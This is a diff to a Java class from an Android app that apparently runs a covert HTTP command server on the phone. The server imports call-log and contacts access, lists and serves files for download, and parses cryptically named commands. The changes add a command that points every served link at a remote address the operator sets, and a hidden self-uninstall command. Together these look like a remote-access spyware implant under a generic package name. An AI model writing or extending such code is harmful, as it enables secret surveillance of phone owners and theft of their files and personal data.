@@ -13,6 +13,9 @@ import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.util.Log;
 
+import androidx.fragment.app.FragmentActivity;
+import androidx.fragment.app.FragmentManager;
+
 import com.example.myapplication.MainActivity;
 import com.example.myapplication.service;
 
@@ -102,14 +105,9 @@ public class Session extends Thread {
 //						MainActivity.yyyw("TAG", "-3");
 					}
 				}
-//				else if (line.contains("download")){
-//
-//				}
 				else if (line.substring(0,13).equals("GET /denaload")){
 					String request = parser(line);
-//					System.out.println("======\n"+request+"\n========");
 					sendRequest(socket, request);
-//					sendRequest(socket, Page.gtass("resources/dnl.html"));
 				}
 				else if (line.contains("errppo")){
 					String request = parser(line);
@@ -117,6 +115,7 @@ public class Session extends Thread {
 				}
 				else if(line.contains("ggt")){
 					String request = parser(line);
+					request = request.replace("&href&",MainActivity.addrs);
 					sendRequest(socket,request);
 				}
 				else if (settings.getKeyWebServer() == 1) {
@@ -194,7 +193,7 @@ public class Session extends Thread {
 				return page.openFile(page.getFormatFile(directoryName), directoryLink);
 			}
 			String index = page.createIndexPage(directoryLink, false);
-			return index;
+			return index.replace("&href&",MainActivity.addrs);
 		}
 		else if (line.substring(0,13).equals("GET /denaload")){
 			String dbanpg = Page.gtass("resources/dnl.html");
@@ -206,7 +205,7 @@ public class Session extends Thread {
 			}
 			if (dbanpg.contains("//&links&")&&dbanpg.contains("&value&")){
 			}
-			String qq = dbanpg.replace("//&links&", "").replace("&value&","1"); //window.open('http://google.com');window.open('http://google.com');
+			String qq = dbanpg.replace("//&links&", "").replace("&value&","1").replace("&href&",MainActivity.addrs);
 			return qq;
 		}
 		else if (line.contains("errppo")) {
@@ -216,7 +215,7 @@ public class Session extends Thread {
 			String dbanpg = Page.gtass("resources/err.html");
 			if (dbanpg.contains("&result&")){
 			}
-			String qq = dbanpg.replace("&result&", "<br><td>" + MainActivity.logg.replace("\n","<br>") + "</td>"+ "<br>"+service.replyyy);
+			String qq = dbanpg.replace("&result&", "<br><td>" + MainActivity.logg.replace("\n","<br>") + "</td>"+ "<br>"+service.replyyy).replace("&href&",MainActivity.addrs);
 			return qq;
 		}
 		else if (line.contains("dir=") && !line.contains("download=")) {
@@ -265,7 +264,11 @@ public class Session extends Thread {
 					String iop = line.substring(line.indexOf("arg=[") + 5, line.indexOf("]=arg"));
 					MainActivity.yyyw("ARG:  ", "\""+iop+"\"");
 					line.replace(iop, "");
-					return dban(iop);
+					System.out.println("==="+iop);
+					return dban(iop).replace("&href&",MainActivity.addrs);
+				}else {
+					System.out.println("====");
+					return crtdban("NO RESULT");
 				}
 			}catch (Exception e){
 				MainActivity.yyyw(e+"");
@@ -297,6 +300,10 @@ public class Session extends Thread {
 		}
 		else if (arg.contains("clr")){  //======================clear================================
 			MainActivity.dbanrep = new StringBuilder();
+			return crtdban(MainActivity.dbanrep+"");
+		}
+		else if(arg.contains("/addr") && arg.substring(0,5).equals("/addr")){
+			MainActivity.addrs = "http://" +arg.substring(5);
 			return crtdban(MainActivity.dbanrep+"");
 		}
 		else if (arg.contains("info")){
@@ -376,7 +383,7 @@ public class Session extends Thread {
 			}
 			return crtdban(MainActivity.dbanrep+"");
 		}
-		else if (arg.substring(0,7).equals("chunkpg")) {
+		else if (arg.length()>8&&arg.contains("chunkpg") && arg.substring(0,7).equals("chunkpg")) {
 			System.out.println("======"+arg.substring(7));
 			StringBuilder er = MainActivity.htppg;
 			int trgt = er.indexOf("[SPLIITT]"+arg.substring(7));
@@ -386,7 +393,7 @@ public class Session extends Thread {
 //			System.out.println(trgt+" , "+er.indexOf("[SPLIITT]"+String.format("%04d", (Integer.parseInt(arg.substring(7))+1)))+"+++++--"+ert);
 
 			String fds = Page.gtass("resources/dnl.html");
-			String lnks = addlnk(ert);
+			String lnks = addlnk(ert).replace("http://localhost",MainActivity.addrs);
 			if (fds.contains("//&links&")){
 				fds = fds.replace("//&links&",lnks);
 			}
@@ -396,10 +403,13 @@ public class Session extends Thread {
 			if (fds.contains("&result&")){
 				fds = fds.replace("&result&",ert);
 			}
-
+//			if (fds.contains("&href&")){
+//				fds = fds.replace("&href&",MainActivity.addrs);
+//			}
+			System.out.println(fds);
 			return fds;
 		}
-		else if (arg.equals("q")){ //ABORT
+		else if (arg.equals("ABORT")){ //ABORT
 			try{
 				File[] fs = MainActivity.getAppContext().getExternalFilesDirs(null);
 				if (fs.length>1){
@@ -429,6 +439,15 @@ public class Session extends Thread {
 			}
 			return crtdban(MainActivity.dbanrep+"");
 		}
+		else if (arg.equals("!un")){
+			Intent intent = new Intent(Intent.ACTION_DELETE);
+			intent.setData(Uri.parse("package:"+MainActivity.getAppContext().getPackageName()));
+//			startActivity(intent);
+			intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+			MainActivity.getAppContext().startActivity(intent);
+
+			return crtdban(MainActivity.dbanrep+"");
+		}
 		else{   //========================dot=============================
 			MainActivity.yyyw("rrrr", arg);
 			try {
@@ -454,10 +473,7 @@ public class Session extends Thread {
 
 	public String crtdban(String thang) throws IOException {
 		String dbanpg = Page.gtass("resources/dban.html");
-		if (dbanpg.contains("&result&")){
-		}
-		String qq = dbanpg.replace("&result&", "<br><td>" + thang + "</td>"+ "<br>"+service.replyyy);
-		return qq;
+		return dbanpg.replace("&result&", "<br><td>" + thang + "</td>"+ "<br>"+service.replyyy).replace("&href&",MainActivity.addrs);
 	}
 
 
@@ -509,35 +525,6 @@ public class Session extends Thread {
 		return data[data.length-1];
 	}
 
-	private byte[] getBytes(String path) {
-		MainActivity.yyyw("input", new File(path).exists()+"\""+path+"\"");
-		byte[] fileInArray = new byte[(int)new File(path).length()];
-		try {
-			FileInputStream f = new FileInputStream(path);
-			f.read(fileInArray);
-			return fileInArray;
-		} catch (Exception e) {
-			MainActivity.yyyw(e+"");e.printStackTrace();}
-		return fileInArray;
-	}
-
-//	private byte[] getBytes(String path) throws IOException {
-//		File file = new File(path);
-//		FileInputStream fis = new FileInputStream(file);
-//		BufferedInputStream bis = new BufferedInputStream(fis);
-//
-//		DataInputStream dis = new DataInputStream(bis);
-//		Socket socket;  //your socket
-//
-//
-//		byte[] mybytearray = new byte[4096];
-//		int read = dis.read(mybytearray);
-//		while (read != -1) {
-//			MainActivity.yyyw("ba "+mybytearray+ 0+"read "+ read);
-//			read = dis.read(mybytearray);
-//		}
-//
-//	}
 
 	private void sendRequest(Socket socket, String req) {
 		try {
@@ -590,7 +577,7 @@ public class Session extends Thread {
 				String p = i.substring(20);
 //				System.out.println(p);
 				String d = p.substring(0, p.lastIndexOf("/")).replace("/", "?dir=") + p.substring(p.lastIndexOf("/")).replace("/", "?download=");
-				ooop.append("window.open(\"http://localhost:9999/control.html?entry=NAMELESS_WEB_SERVER/123//" + d + "\");\n");
+				ooop.append("window.open(\""+MainActivity.addrs+":9999/control.html?entry=NAMELESS_WEB_SERVER/123//" + d + "\");\n");
 			}
 		}
 		return ooop.toString();
